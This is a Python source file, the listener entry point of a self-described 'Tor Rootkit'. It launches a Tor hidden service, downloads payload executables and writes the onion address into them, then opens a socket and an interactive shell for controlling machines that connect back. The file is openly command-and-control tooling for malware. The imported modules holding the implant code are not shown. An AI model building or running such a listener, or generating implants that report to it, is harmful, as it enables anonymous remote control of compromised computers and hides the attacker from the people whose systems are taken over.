#!/usr/bin/env python3
from shell import ListenerShell
from shell_ui.style import Style
from argparse import ArgumentParser
import shell_ui.ascii_art as banner
import generate_executables
from network import (
    ListenerSocket,
    Tor
)


class Listener:
    """
    The main class of the listener Package.
    It handles all other modules of the listener package.
    """

    def __init__(self):
        listener_port, forward_port = Listener.parse_args()
        self.tor_hidden_service = Tor('listener', listener_port, forward_port)
        generate_executables.download_executables()

        listener_socket = ListenerSocket(forward_port)
        generate_executables.append_address(self.tor_hidden_service.get_onion_address(), listener_port)
        listener_socket.start()
        shell = ListenerShell(listener_socket)
        shell.run()

    @staticmethod
    def parse_args():
        """
        Read the command line args of the programm call and parse them.
        """
        parser = ArgumentParser(description='Python3 Tor Rootkit Listener')
        parser.add_argument('listener_port', type=int, help='The port the hidden service should listen on.')
        parser.add_argument('forward_port', type=int, help='The port the hidden service should forward to.')
        args = parser.parse_args()
        return args.listener_port, args.forward_port

    def __del__(self):
        try:
            self.tor_hidden_service.tor_process.terminate()
        except AttributeError:
            pass
        else:
            Style.neg_sys_msg('Terminated Tor Process')
        finally:
            Style.neg_sys_msg('Exiting')


if __name__ == '__main__':
    banner.draw()
    Listener()
